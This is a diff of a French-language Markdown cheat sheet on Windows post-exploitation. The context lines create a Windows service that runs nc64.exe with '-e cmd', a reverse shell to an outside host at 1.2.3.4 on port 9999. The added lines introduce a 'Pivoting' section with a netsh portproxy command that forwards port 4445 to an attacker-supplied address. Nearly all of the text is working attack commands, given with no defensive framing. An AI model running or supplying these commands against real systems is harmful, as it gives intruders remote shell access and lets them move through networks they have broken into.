@@ -88,3 +88,12 @@ Créer un service:
 sc create cmdsvc binpath= "C:\tmp\nc64.exe 1.2.3.4 9999 -e cmd" type= own type= interact
 sc cmdsvc start
 ```
+
+
+## Pivoting
+
+Port forwarding natif windows:
+
+```
+netsh interface portproxy add v4tov4 listenport=4445 listenaddress=0.0.0.0 connectport=4445 connectaddress=<your.address>
+```
